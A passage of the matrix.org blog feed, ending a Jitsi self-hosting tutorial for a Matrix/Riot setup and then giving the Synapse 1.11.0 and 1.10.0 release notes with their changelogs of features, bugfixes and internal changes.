&lt;li&gt;Finally, we install Jitsi so you can run your own video conferencing.  We take the instructions from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;jitsi&#x2F;jitsi-meet&#x2F;blob&#x2F;master&#x2F;doc&#x2F;quick-install.md&quot;&gt;Jitsi&#x27;s quick install guide&lt;&#x2F;a&gt;:&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#1e1e1e;color:#dcdcdc;&quot;&gt;&lt;code&gt;&lt;span&gt;echo &amp;#39;deb https:&#x2F;&#x2F;download.jitsi.org stable&#x2F;&amp;#39; &amp;gt;&amp;gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;jitsi-stable.list
&lt;&#x2F;span&gt;&lt;span&gt;wget -qO -  https:&#x2F;&#x2F;download.jitsi.org&#x2F;jitsi-key.gpg.key | sudo apt-key add -
&lt;&#x2F;span&gt;&lt;span&gt;apt-get update
&lt;&#x2F;span&gt;&lt;span&gt;apt-get -y install jitsi-meet
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;We give the installer the hostname &lt;code&gt;jitsi.dangerousdemos.net&lt;&#x2F;code&gt;.  &lt;strong&gt;Make sure this DNS is already set up, otherwise the installer will fail!&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The installer magically detects you have nginx installed and adds in an appropriate vhost!&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;We select a self-signed certificate for now, and then upgrade it to LetsEncrypt after the fact with &lt;code&gt;&#x2F;usr&#x2F;share&#x2F;jitsi-meet&#x2F;scripts&#x2F;install-letsencrypt-cert.sh&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Alternatively, you could have specified manual certificates, and then used &lt;code&gt;certbot&lt;&#x2F;code&gt; alongside the rest of nginx to create a certificate for &lt;code&gt;jitsi.dangerousdemos.net&lt;&#x2F;code&gt; - both work.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;You should now be able to go to https:&#x2F;&#x2F;jitsi.dangerousdemos.net and use the Jitsi directly.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Finally, and this is the cool new bit: you can now point Riot to use the new Jitsi by going to its config.json at &lt;code&gt;&#x2F;var&#x2F;www&#x2F;riot.dangerousdemos.net&#x2F;riot&#x2F;config.json&lt;&#x2F;code&gt; and changing the &lt;code&gt;preferredDomain&lt;&#x2F;code&gt; of the &lt;code&gt;jitsi&lt;&#x2F;code&gt; block from &lt;code&gt;https:&#x2F;&#x2F;jitsi.riot.im&lt;&#x2F;code&gt; to your own self-hosted &lt;code&gt;https:&#x2F;&#x2F;jitsi.dangerousdemos.net&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;You then refresh your Riot&#x2F;Web, and you should be all set to use Jitsi from within your new Riot - as Riot&#x2F;Web 1.5.15 and later has the ability to natively embed Jitsi straight into the app without needing to use an integration manager.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h3&gt;
&lt;p&gt;Matrix nowadays provides an excellent alternative to the centralised solutions.  It gives:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Full autonomy over how to host and store your own conversations&lt;&#x2F;li&gt;
&lt;li&gt;Full freedom to talk to anyone else on the wider global Matrix network (or indeed anyone else bridged into Matrix)&lt;&#x2F;li&gt;
&lt;li&gt;Full privacy via full end-to-end-encryption for chats, file transfer and 1:1 voice&#x2F;video calls (when enabled)&lt;&#x2F;li&gt;
&lt;li&gt;Full transparency by being 100% open source (as well as benefiting from the overall open source community)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Hopefully this gives some confidence that it&#x27;s pretty easy to run your own fully functional Matrix instance these days.
If not, then hopefully someone will do a similar one to show off Docker!
And if that&#x27;s still too scary, please take a look at a hosting services like &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;(Comments over at &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=22793239&quot;&gt;HN&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=22802645&quot;&gt;here too&lt;&#x2F;a&gt;)&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 1.11.0 released</title>
        <published>2020-02-24T00:00:00+00:00</published>
        <updated>2020-02-24T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/02/24/synapse-1-11-0-released/" type="text/html"/>
        <id>https://matrix.org/blog/2020/02/24/synapse-1-11-0-released/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Synapse 1.11 landed on Friday (sorry for running late on blogging the release notes!)&lt;&#x2F;p&gt;
&lt;p&gt;The main change is to introduce an experimental API &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2432&quot;&gt;MSC2432&lt;&#x2F;a&gt; for managing aliases for rooms on your local server.  In Synapse 1.10 we removed support for &lt;code&gt;m.room.aliases&lt;&#x2F;code&gt; events, which were a way to try to track which aliases a room had on the room itself (but were vulnerable to abuse).  In this release we&#x27;ve re-added the ability to query which aliases a given server has for the room, giving visibility for managing aliases, without having them spray all over the room state itself.  Riot&#x2F;Web 1.5.10 supports the new API, giving a way to manage aliases on your local server while we finish off the remaining work to improve alias safety &amp;amp; maintenance.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve also changed the default power levels for new rooms so that room upgrades and ACLs require you to be an Admin (PL100), and invites in public rooms now require you to be a moderator (PL50).&lt;&#x2F;p&gt;
&lt;p&gt;Get the new release from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.11.0&quot;&gt;github&lt;&#x2F;a&gt; or any of the sources mentioned at https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;INSTALL.md.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;synapse-1-11-0-2020-02-21&quot;&gt;Synapse 1.11.0 (2020-02-21)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;improved-documentation&quot;&gt;Improved Documentation&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Small grammatical fixes to the ACME v1 deprecation notice. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6944&quot;&gt;#6944&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;synapse-1-11-0rc1-2020-02-19&quot;&gt;Synapse 1.11.0rc1 (2020-02-19)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;features&quot;&gt;Features&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Admin API to add or modify threepids of user accounts. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6769&quot;&gt;#6769&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Limit the number of events that can be requested by the backfill federation API to 100. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6864&quot;&gt;#6864&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add ability to run some group APIs on workers. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6866&quot;&gt;#6866&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Reject device display names over 100 characters in length to prevent abuse. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6882&quot;&gt;#6882&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add ability to route federation user device queries to workers. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6873&quot;&gt;#6873&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;The result of a user directory search can now be filtered via the spam checker. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6888&quot;&gt;#6888&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Implement new &lt;code&gt;GET &#x2F;_matrix&#x2F;client&#x2F;unstable&#x2F;org.matrix.msc2432&#x2F;rooms&#x2F;{roomId}&#x2F;aliases&lt;&#x2F;code&gt; endpoint as per &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2432&quot;&gt;MSC2432&lt;&#x2F;a&gt;. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6939&quot;&gt;#6939&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6948&quot;&gt;#6948&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6949&quot;&gt;#6949&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Stop sending &lt;code&gt;m.room.aliases&lt;&#x2F;code&gt; events when adding &#x2F; removing aliases. Check &lt;code&gt;alt_aliases&lt;&#x2F;code&gt; in the latest &lt;code&gt;m.room.canonical_alias&lt;&#x2F;code&gt; event when deleting an alias. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6904&quot;&gt;#6904&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Change the default power levels of invites, tombstones and server ACLs for new rooms. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;6834&quot;&gt;#6834&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;bugfixes&quot;&gt;Bugfixes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Fixed third party event rules function &lt;code&gt;on_create_room&lt;&#x2F;code&gt;&#x27;s return value being ignored. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6781&quot;&gt;#6781&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Allow URL-encoded User IDs on &lt;code&gt;&#x2F;_synapse&#x2F;admin&#x2F;v2&#x2F;users&#x2F;&amp;lt;user_id&amp;gt;[&#x2F;admin]&lt;&#x2F;code&gt; endpoints. Thanks to @NHAS for reporting. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6825&quot;&gt;#6825&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix Synapse refusing to start if &lt;code&gt;federation_certificate_verification_whitelist&lt;&#x2F;code&gt; option is blank. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6849&quot;&gt;#6849&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix errors from logging in the purge jobs related to the message retention policies support. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6945&quot;&gt;#6945&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Return a 404 instead of 200 for querying information of a non-existent user through the admin API. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6901&quot;&gt;#6901&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;updates-to-the-docker-image&quot;&gt;Updates to the Docker image&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;The deprecated &amp;quot;generate-config-on-the-fly&amp;quot; mode is no longer supported. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6918&quot;&gt;#6918&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;improved-documentation-1&quot;&gt;Improved Documentation&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Add details of PR merge strategy to contributing docs. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6846&quot;&gt;#6846&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Spell out that the last event sent to a room won&#x27;t be deleted by a purge. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6891&quot;&gt;#6891&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Update Synapse&#x27;s documentation to warn about the deprecation of ACME v1. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6905&quot;&gt;#6905&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6907&quot;&gt;#6907&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6909&quot;&gt;#6909&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add documentation for the spam checker. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6906&quot;&gt;#6906&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix worker docs to point &lt;code&gt;&#x2F;publicised_groups&lt;&#x2F;code&gt; API correctly. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6938&quot;&gt;#6938&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Clean up and update docs on setting up federation. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6940&quot;&gt;#6940&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add a warning about indentation to generated configuration files. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6920&quot;&gt;#6920&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Databases created using the compose file in contrib&#x2F;docker will now always have correct encoding and locale settings. Contributed by Fridtjof Mund. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6921&quot;&gt;#6921&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Update pip install directions in readme to avoid error when using zsh. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6855&quot;&gt;#6855&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;deprecations-and-removals&quot;&gt;Deprecations and Removals&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Remove &lt;code&gt;m.lazy_load_members&lt;&#x2F;code&gt; from &lt;code&gt;unstable_features&lt;&#x2F;code&gt; since lazy loading is in the stable Client-Server API version r0.5.0. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6877&quot;&gt;#6877&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;internal-changes&quot;&gt;Internal Changes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Add type hints to &lt;code&gt;SyncHandler&lt;&#x2F;code&gt;. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6821&quot;&gt;#6821&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Refactoring work in preparation for changing the event redaction algorithm. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6823&quot;&gt;#6823&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6827&quot;&gt;#6827&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6854&quot;&gt;#6854&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6856&quot;&gt;#6856&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6857&quot;&gt;#6857&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6858&quot;&gt;#6858&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix stacktraces when using &lt;code&gt;ObservableDeferred&lt;&#x2F;code&gt; and async&#x2F;await. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6836&quot;&gt;#6836&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Port much of &lt;code&gt;synapse.handlers.federation&lt;&#x2F;code&gt; to async&#x2F;await. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6837&quot;&gt;#6837&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6840&quot;&gt;#6840&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Populate &lt;code&gt;rooms.room_version&lt;&#x2F;code&gt; database column at startup, rather than in a background update. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6847&quot;&gt;#6847&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Reduce amount we log at &lt;code&gt;INFO&lt;&#x2F;code&gt; level. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6833&quot;&gt;#6833&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6862&quot;&gt;#6862&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Remove unused &lt;code&gt;get_room_stats_state&lt;&#x2F;code&gt; method. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6869&quot;&gt;#6869&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add typing to &lt;code&gt;synapse.federation.sender&lt;&#x2F;code&gt; and port to async&#x2F;await. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6871&quot;&gt;#6871&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Refactor &lt;code&gt;_EventInternalMetadata&lt;&#x2F;code&gt; object to improve type safety. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6872&quot;&gt;#6872&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add an additional entry to the SyTest blacklist for worker mode. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6883&quot;&gt;#6883&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix the use of sed in the linting scripts when using BSD sed. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6887&quot;&gt;#6887&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add type hints to the spam checker module. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6915&quot;&gt;#6915&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Convert the directory handler tests to use HomeserverTestCase. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6919&quot;&gt;#6919&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Increase DB&#x2F;CPU perf of &lt;code&gt;_is_server_still_joined&lt;&#x2F;code&gt; check. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6936&quot;&gt;#6936&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Tiny optimisation for incoming HTTP request dispatch. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6950&quot;&gt;#6950&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 1.10.0 released</title>
        <published>2020-02-12T00:00:00+00:00</published>
        <updated>2020-02-12T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2020/02/12/synapse-1-10-0-released/" type="text/html"/>
        <id>https://matrix.org/blog/2020/02/12/synapse-1-10-0-released/</id>
        
        <content type="html">&lt;p&gt;The whole Matrix project is racing towards enabling e2ee by default. Synapse is no different and v1.10.0 contains multiple e2ee UX improvements, as well as a bug fix that prevented cross signing requests over federation to work reliably.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;If&lt;&#x2F;em&gt; any of your users are on the bleeding edge and have already started using cross signing (by enabling labs flags in Riot), then it will be necessary for them to force Synapse to re-send device updates by renaming all of their devices.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve also included a temporary fix to address alias abuse. The idea is that until &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6898&quot;&gt;#6898&lt;&#x2F;a&gt; lands, servers will refrain from sharing events of type &lt;code&gt;m.room.aliases&lt;&#x2F;code&gt; with clients. Most admins will not be affected, but if you are present in rooms subject to alias abuse, then upgrading provides a pragmatic short term solution.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, as of this release Synapse validates &lt;code&gt;client_secret&lt;&#x2F;code&gt; parameters in the Client-Server API as per the spec. See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6766&quot;&gt;#6766&lt;&#x2F;a&gt; for details.&lt;&#x2F;p&gt;
&lt;p&gt;Get the new release from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.10.0&quot;&gt;github&lt;&#x2F;a&gt; or any of the sources mentioned at https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;INSTALL.md.&lt;&#x2F;p&gt;
&lt;p&gt;Changelog since Synapse 1.9.0&lt;&#x2F;p&gt;
&lt;h1 id=&quot;synapse-1-10-0-2020-02-12&quot;&gt;Synapse 1.10.0 (2020-02-12)&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;strong&gt;WARNING to client developers&lt;&#x2F;strong&gt;: As of this release Synapse validates &lt;code&gt;client_secret&lt;&#x2F;code&gt; parameters in the Client-Server API as per the spec. See &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6766&quot;&gt;#6766&lt;&#x2F;a&gt; for details.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;updates-to-the-docker-image&quot;&gt;Updates to the Docker image&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Update the docker images to Alpine Linux 3.11. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6897&quot;&gt;#6897&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;synapse-1-10-0rc5-2020-02-11&quot;&gt;Synapse 1.10.0rc5 (2020-02-11)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;bugfixes&quot;&gt;Bugfixes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Fix the filtering introduced in 1.10.0rc3 to also apply to the state blocks returned by &lt;code&gt;&#x2F;sync&lt;&#x2F;code&gt;. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6884&quot;&gt;#6884&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;synapse-1-10-0rc4-2020-02-11&quot;&gt;Synapse 1.10.0rc4 (2020-02-11)&lt;&#x2F;h1&gt;
&lt;p&gt;This release candidate was built incorrectly and is superseded by 1.10.0rc5.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;synapse-1-10-0rc3-2020-02-10&quot;&gt;Synapse 1.10.0rc3 (2020-02-10)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;features&quot;&gt;Features&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Filter out &lt;code&gt;m.room.aliases&lt;&#x2F;code&gt; from the CS API to mitigate abuse while a better solution is specced. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6878&quot;&gt;#6878&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;internal-changes&quot;&gt;Internal Changes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Fix continuous integration failures with old versions of &lt;code&gt;pip&lt;&#x2F;code&gt;, which were introduced by a release of the &lt;code&gt;zipp&lt;&#x2F;code&gt; library. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6880&quot;&gt;#6880&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;synapse-1-10-0rc2-2020-02-06&quot;&gt;Synapse 1.10.0rc2 (2020-02-06)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;bugfixes-1&quot;&gt;Bugfixes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Fix an issue with cross-signing where device signatures were not sent to remote servers. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6844&quot;&gt;#6844&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix to the unknown remote device detection which was introduced in 1.10.rc1. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6848&quot;&gt;#6848&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;internal-changes-1&quot;&gt;Internal Changes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Detect unexpected sender keys on remote encrypted events and resync device lists. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;6850&quot;&gt;#6850&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
